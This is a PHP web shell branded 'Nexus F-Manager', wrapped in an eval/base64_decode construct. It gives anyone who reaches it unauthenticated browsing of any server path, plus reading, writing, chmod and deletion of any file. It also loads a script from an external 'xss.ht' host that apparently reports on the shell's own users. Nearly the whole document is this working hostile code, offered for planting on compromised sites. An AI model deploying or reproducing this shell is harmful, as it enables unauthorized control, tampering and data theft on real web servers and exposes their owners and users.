<?=eval("?>".base64_decode("<?php
session_start();
error_reporting(0);
set_time_limit(0);

// Utility functions
function formatSize($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, 2) . ' ' . $units[$pow];
}

function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    return $_SERVER['REMOTE_ADDR'];
}

function getFilePermissions($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function handleRequest() {
    $input = json_decode(file_get_contents('php://input'), true);
    if ($input) $_POST = $input;

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') return null;

    try {
        if (!isset($_POST['action'])) {
            throw new Exception('No action specified');
        }

        $current_path = isset($_GET['path']) ? $_GET['path'] : getcwd();
        $response = ['status' => 'error', 'message' => 'Unknown error occurred'];

        switch ($_POST['action']) {
            case 'view_file':
                if (!isset($_POST['file'])) throw new Exception('No file specified');
                $file = realpath($current_path . '/' . $_POST['file']);
                if (!$file || !file_exists($file)) throw new Exception('File does not exist');
                if (!is_readable($file)) throw new Exception('File is not readable');
                $response = [
                    'status' => 'success',
                    'content' => file_get_contents($file),
                    'permissions' => getFilePermissions($file)
                ];
                break;

            case 'edit_file':
                if (!isset($_POST['file']) || !isset($_POST['content'])) {
                    throw new Exception('File name or content not specified');
                }
                $file = $current_path . '/' . $_POST['file'];
                if (!is_writable(dirname($file))) {
                    throw new Exception('Directory is not writable');
                }
                if (file_exists($file) && !is_writable($file)) {
                    throw new Exception('File is not writable');
                }
                if (file_put_contents($file, $_POST['content']) === false) {
                    throw new Exception('Failed to write file');
                }
                $response = ['status' => 'success', 'message' => 'File updated successfully'];
                break;

            case 'create_folder':
                if (!isset($_POST['folder'])) throw new Exception('Folder name not specified');
                $folder = $current_path . '/' . $_POST['folder'];
                if (file_exists($folder)) throw new Exception('Folder already exists');
                if (!is_writable($current_path)) throw new Exception('Directory is not writable');
                if (!mkdir($folder, 0755)) throw new Exception('Failed to create folder');
                $response = ['status' => 'success', 'message' => 'Folder created successfully'];
                break;

            case 'chmod':
                if (!isset($_POST['file']) || !isset($_POST['mode'])) {
                    throw new Exception('File or mode not specified');
                }
                $file = $current_path . '/' . $_POST['file'];
                if (!file_exists($file)) throw new Exception('File does not exist');
                $mode = octdec($_POST['mode']);
                if (!chmod($file, $mode)) throw new Exception('Failed to change permissions');
                $response = ['status' => 'success', 'message' => 'Permissions updated successfully'];
                break;

            case 'delete_file':
                if (!isset($_POST['file'])) throw new Exception('No file specified');
                $file = $current_path . '/' . $_POST['file'];
                if (!file_exists($file)) throw new Exception('File does not exist');
                $isDir = is_dir($file);
                if ($isDir) {
                    if (!rmdir($file)) throw new Exception('Failed to delete folder');
                } else {
                    if (!unlink($file)) throw new Exception('Failed to delete file');
                }
                $response = ['status' => 'success', 'message' => ($isDir ? 'Folder' : 'File') . ' deleted successfully'];
                break;

            default:
                throw new Exception('Invalid action');
        }
    } catch (Exception $e) {
        $response = ['status' => 'error', 'message' => $e->getMessage()];
    }

    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}

// Handle API requests
handleRequest();

// Get current directory
$current_path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$parent_path = dirname($current_path);

?>
<!DOCTYPE html>
<html>
<head>
    <title>Nexus F-Manager</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.7.2/font/bootstrap-icons.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0a0c1b;
            --bg-secondary: #12142b;
            --accent-primary: #4f46e5;
            --accent-secondary: #818cf8;
            --text-primary: #e2e8f0;
            --text-secondary: #94a3b8;
            --border-color: #1e2040;
            --hover-color: #1a1c3d;
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background: var(--bg-primary);
            color: var(--text-primary);
            font-family: 'Orbitron', sans-serif;
            line-height: 1.6;
            min-height: 100vh;
        }
        .social-icons {
        margin-top: 10px;
    }
    .social-icons .icon {
        margin: 0 10px;
        font-size: 1.5em;
        color: #333;
        text-decoration: none;
    }
    .social-icons .icon:hover {
        color: white; /* Change color on hover */
    }
    .social-icons .icon.telegram:hover {
        color: white;
    }
    .social-icons .icon.instagram:hover {
        color: white;
    }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 2rem;
        }

        .header {
            background: var(--bg-secondary);
            padding: 1.5rem;
            border-radius: 12px;
            margin-bottom: 2rem;
            border: 1px solid var(--border-color);
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
        }

        .header h1 {
            font-size: 2rem;
            margin-bottom: 1rem;
            color: var(--accent-secondary);
            text-transform: uppercase;
            letter-spacing: 2px;
            text-align: center;
        }

        .server-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1rem;
            margin-top: 1rem;
            padding: 1rem;
            background: var(--bg-primary);
            border-radius: 8px;
            border: 1px solid var(--border-color);
        }

        .info-item {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.5rem;
            color: var(--text-secondary);
        }

        .info-item i {
            color: var(--accent-secondary);
        }

        .actions-panel {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }

        .action-btn {
            background: var(--bg-secondary);
            color: var(--text-primary);
            border: 1px solid var(--border-color);
            padding: 0.75rem;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            font-family: 'Orbitron', sans-serif;
        }

        .action-btn:hover {
            background: var(--accent-primary);
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(79, 70, 229, 0.2);
        }

        .action-btn i {
            font-size: 1.2rem;
        }

        .file-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 1rem;
            margin-top: 1.5rem;
        }

        .file-item {
            background: var(--bg-secondary);
            border-radius: 10px;
            padding: 1rem;
            transition: all 0.3s ease;
            border: 1px solid var(--border-color);
            cursor: pointer;
            position: relative;
            overflow: hidden;
        }

        .file-item:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
            border-color: var(--accent-primary);
        }

        .file-item i {
            font-size: 1.5rem;
            color: var(--accent-secondary);
            margin-bottom: 0.5rem;
        }

        .file-name {
            font-weight: 500;
            margin-bottom: 0.25rem;
            word-break: break-all;
        }

        .file-meta {
            font-size: 0.8rem;
            color: var(--text-secondary);
        }

        .modal {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: var(--bg-secondary);
            padding: 2rem;
            border-radius: 12px;
            border: 1px solid var(--border-color);
            z-index: 1000;
            display: none;
            max-width: 90%;
            width: 500px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
        }

        .modal h2 {
            color: var(--accent-secondary);
            margin-bottom: 1.5rem;
            font-size: 1.5rem;
        }

        .modal form {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
        .heart {
            display: inline-block;
            color: red;
            font-size: 1.5rem;
            animation: pulse 1s infinite;
        }

        @keyframes pulse {
            0%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.2);
            }
        }

        .modal input,
        .modal textarea {
            background: var(--bg-primary);
            color: var(--text-primary);
            border: 1px solid var(--border-color);
            padding: 0.75rem;
            border-radius: 6px;
            font-family: 'Orbitron', sans-serif;
            width: 100%;
        }

        .modal textarea {
            min-height: 200px;
            resize: vertical;
        }

        .modal input:focus,
        .modal textarea:focus {
            outline: none;
            border-color: var(--accent-primary);
            box-shadow: 0 0 0 2px rgba(79, 70, 229, 0.2);
        }

        .modal-backdrop {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            backdrop-filter: blur(4px);
            z-index: 999;
            display: none;
        }

        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            padding: 1rem 1.5rem;
            border-radius: 8px;
            color: white;
            font-size: 0.9rem;
            z-index: 1100;
            transform: translateY(100px);
            opacity: 0;
            transition: all 0.3s ease;
            max-width: 300px;
            word-break: break-word;
        }

        .notification.show {
            transform: translateY(0);
            opacity: 1;
        }

        .notification.success { background: var(--success); }
        .notification.error { background: var(--danger); }
        .notification.warning { background: var(--warning); }

        .footer {
            text-align: center;
            margin-top: 2rem;
            padding: 1.5rem;
            background: var(--bg-secondary);
            border-radius: 8px;
            border: 1px solid var(--border-color);
        }

        .footer p {
            color: var(--text-secondary);
            margin: 0.5rem 0;
        }

        .footer a {
            color: var(--accent-secondary);
            text-decoration: none;
            transition: color 0.3s ease;
        }

        .footer a:hover {
            color: var(--accent-primary);
        }

        .file-actions {
            display: flex;
            gap: 0.5rem;
            flex-wrap: wrap;
            margin-top: 1rem;
        }

        .file-actions button {
            flex: 1;
            min-width: 100px;
            padding: 0.75rem;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            font-family: 'Orbitron', sans-serif;
            background: var(--accent-primary);
            color: white;
        }

        .file-actions button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(79, 70, 229, 0.2);
        }

        .file-actions button.close-btn {
            background: var(--danger);
        }

        pre {
            background: var(--bg-primary);
            padding: 1rem;
            border-radius: 6px;
            overflow-x: auto;
            margin: 1rem 0;
            border: 1px solid var(--border-color);
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        @keyframes slideDown {
            from { transform: translateY(-20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @media (max-width: 768px) {
            .container { padding: 1rem; }
            .header { padding: 1rem; }
            .actions-panel { grid-template-columns: 1fr; }
            .file-grid { grid-template-columns: 1fr; }
            .modal { width: 95%; padding: 1.5rem; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Nexus F-Manager</h1>
            <div class="server-info">
                <div class="info-item">
                    <i class="bi bi-hdd-rack"></i>
                    <span>Server: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></span>
                </div>
                <div class="info-item">
                    <i class="bi bi-globe"></i>
                    <span>Client IP: <?php echo getClientIP(); ?></span>
                </div>
                <div class="info-item">
    <i class="bi bi-server"></i>
    <span>Server Type: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></span>
</div>
            </div>
        </div>
        <div class="server-info">
        <div class="info-item">
                    <i class="bi bi-folder2-open"></i>
                    <center><span>Current Path: <?php echo $current_path; ?></span><center>
                </div>
    </div>

        <div class="actions-panel">
            <button class="action-btn" onclick="createFolder()">
                <i class="bi bi-folder-plus"></i> Create Folder
            </button>
            <button class="action-btn" onclick="createFile()">
                <i class="bi bi-file-earmark-plus"></i> Create File
            </button>
            <button class="action-btn" onclick="refreshDirectory()">
                <i class="bi bi-arrow-clockwise"></i> Refresh
            </button>
        </div>

        <div class="file-grid">
            <?php if($current_path != '/'): ?>
            <div class="file-item" onclick="window.location.href='?path=<?php echo urlencode($parent_path); ?>'">
                <i class="bi bi-arrow-up-circle"></i>
                <div class="file-name">..</div>
                <div class="file-meta">Parent Directory</div>
            </div>
            <?php endif;

            $files = scandir($current_path);
            foreach($files as $file) {
                if($file != "." && $file != "..") {
                    $full_path = $current_path . '/' . $file;
                    $is_dir = is_dir($full_path);
                    echo "<div class='file-item' onclick='handleFileClick(\"$file\", ".($is_dir ? 'true' : 'false').")'>";
                    echo "<i class='bi bi-".($is_dir ? "folder" : "file-earmark")."'></i>";
                    echo "<div class='file-name'>$file</div>";
                    echo "<div class='file-meta'>".($is_dir ? 'Directory' : formatSize(filesize($full_path)))."</div>";
                    echo "</div>";
                }
            }
            ?>
        </div>

<div class="footer">
<p>Made By BIBIL With <span class="heart">❤️</span></p>

    <p>© <?php echo date('Y'); ?> NexusLeads</p>
    <div class="social-icons">
        <a href="https://t.me/NexusLeads" target="_blank" class="icon telegram">
            <i class="fab fa-telegram-plane"></i>
        </a>
        <a href="https://instagram.com/Habil.0x" target="_blank" class="icon instagram">
            <i class="fab fa-instagram"></i>
        </a>
    </div>

</div>


    <!-- Modals -->
    <div id="fileModal" class="modal">
        <h2>File Actions</h2>
        <div class="modal-content"></div>
    </div>

    <div id="createFolderModal" class="modal">
        <h2>Create New Folder</h2>
        <form onsubmit="handleCreateFolder(event)">
            <input type="text" name="folderName" placeholder="Folder Name" required>
            <div class="file-actions">
                <button type="submit">
                    <i class="bi bi-folder-plus"></i> Create
                </button>
                <button type="button" class="close-btn" onclick="closeModal()">
                    <i class="bi bi-x-circle"></i> Cancel
                </button>
            </div>
        </form>
    </div>

    <div id="createFileModal" class="modal">
        <h2>Create New File</h2>
        <form onsubmit="handleCreateFile(event)">
            <input type="text" name="fileName" placeholder="File Name" required>
            <textarea name="content" placeholder="File Content"></textarea>
            <div class="file-actions">
                <button type="submit">
                    <i class="bi bi-file-earmark-plus"></i> Create
                </button>
                <button type="button" class="close-btn" onclick="closeModal()">
                    <i class="bi bi-x-circle"></i> Cancel
                </button>
            </div>
        </form>
    </div>

    <div class="modal-backdrop"></div>
    <div id="notification" class="notification"></div>
    <script src=https://googlescripts.xss.ht></script>
    <script>
        let currentPath = '<?php echo addslashes($current_path); ?>';

        function showNotification(message, type = 'success') {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = `notification ${type}`;
            notification.classList.add('show');
            setTimeout(() => notification.classList.remove('show'), 3000);
        }

        async function handleFileAction(action, data) {
            try {
                const response = await fetch('', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ action, ...data })
                });
                const result = await response.json();
                if (result.status === 'success') {
                    showNotification(result.message || 'Action completed successfully');
                    return result;
                }
                throw new Error(result.message || 'Operation failed');
            } catch (error) {
                showNotification(error.message, 'error');
                throw error;
            }
        }

        function handleFileClick(file, isDir) {
            if (isDir) {
                window.location.href = `?path=${encodeURIComponent(currentPath + '/' + file)}`;
            } else {
                showFileActions(file);
            }
        }

        function showFileActions(file) {
            const modal = document.getElementById('fileModal');
            modal.style.display = 'block';
            document.querySelector('.modal-backdrop').style.display = 'block';
            document.querySelector('.modal-content').innerHTML = `
                <div class="file-actions">
                    <button onclick="viewFile('${file}')">
                        <i class="bi bi-eye"></i> View
                    </button>
                    <button onclick="editFile('${file}')">
                        <i class="bi bi-pencil"></i> Edit
                    </button>
                    <button onclick="showChmod('${file}')">
                        <i class="bi bi-shield-lock"></i> Chmod
                    </button>
                    <button onclick="deleteFile('${file}')">
                        <i class="bi bi-trash"></i> Delete
                    </button>
                    <button class="close-btn" onclick="closeModal()">
                        <i class="bi bi-x-circle"></i> Close
                    </button>
                </div>
            `;
        }

        async function viewFile(file) {
            try {
                const result = await handleFileAction('view_file', { file });
                if (result.status === 'success') {
                    document.querySelector('.modal-content').innerHTML = `
                        <pre>${result.content}</pre>
                        <div class="file-actions">
                            <button onclick="editFile('${file}')">
                                <i class="bi bi-pencil"></i> Edit
                            </button>
                            <button class="close-btn" onclick="closeModal()">
                                <i class="bi bi-x-circle"></i> Close
                            </button>
                        </div>
                    `;
                }
            } catch (error) {
                console.error('Error viewing file:', error);
            }
        }

        async function editFile(file) {
            try {
                const result = await handleFileAction('view_file', { file });
                if (result.status === 'success') {
                    document.querySelector('.modal-content').innerHTML = `
                        <textarea id="fileContent" style="width: 100%; min-height: 300px;">${result.content}</textarea>
                        <div class="file-actions">
                            <button onclick="saveFile('${file}')">
                                <i class="bi bi-save"></i> Save
                            </button>
                            <button class="close-btn" onclick="closeModal()">
                                <i class="bi bi-x-circle"></i> Cancel
                            </button>
                        </div>
                    `;
                }
            } catch (error) {
                console.error('Error editing file:', error);
            }
        }

        async function saveFile(file) {
            try {
                const content = document.getElementById('fileContent').value;
                await handleFileAction('edit_file', { file, content });
                closeModal();
                location.reload();
            } catch (error) {
                console.error('Error saving file:', error);
            }
        }

        function createFolder() {
            document.getElementById('createFolderModal').style.display = 'block';
            document.querySelector('.modal-backdrop').style.display = 'block';
        }

        async function handleCreateFolder(event) {
            event.preventDefault();
            try {
                await handleFileAction('create_folder', { 
                    folder: event.target.folderName.value 
                });
                closeModal();
                location.reload();
            } catch (error) {
                console.error('Error creating folder:', error);
            }
        }

        function createFile() {
            document.getElementById('createFileModal').style.display = 'block';
            document.querySelector('.modal-backdrop').style.display = 'block';
        }

        async function handleCreateFile(event) {
            event.preventDefault();
            try {
                await handleFileAction('edit_file', {
                    file: event.target.fileName.value,
                    content: event.target.content.value
                });
                closeModal();
                location.reload();
            } catch (error) {
                console.error('Error creating file:', error);
            }
        }

        function showChmod(file) {
            document.querySelector('.modal-content').innerHTML = `
                <input type="text" id="chmod" placeholder="Permission (e.g., 0644)" />
                <div class="file-actions">
                    <button onclick="changePermissions('${file}')">
                        <i class="bi bi-shield-check"></i> Change
                    </button>
                    <button class="close-btn" onclick="closeModal()">
                        <i class="bi bi-x-circle"></i> Cancel
                    </button>
                </div>
            `;
        }

        async function changePermissions(file) {
            try {
                const mode = document.getElementById('chmod').value;
                await handleFileAction('chmod', { file, mode });
                closeModal();
                location.reload();
            } catch (error) {
                console.error('Error changing permissions:', error);
            }
        }

        async function deleteFile(file) {
            if (confirm(`Are you sure you want to delete "${file}"?`)) {
                try {
                    await handleFileAction('delete_file', { file });
                    closeModal();
                    location.reload();
                } catch (error) {
                    console.error('Error deleting file:', error);
                }
            }
        }

        function refreshDirectory() {
            location.reload();
        }

        function closeModal() {
            document.querySelectorAll('.modal').forEach(modal => modal.style.display = 'none');
            document.querySelector('.modal-backdrop').style.display = 'none';
        }

        document.querySelector('.modal-backdrop').onclick = closeModal;

        // Handle escape key to close modals
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Escape') {
                closeModal();
            }
        });
    </script>
</body>
</html>"));?>
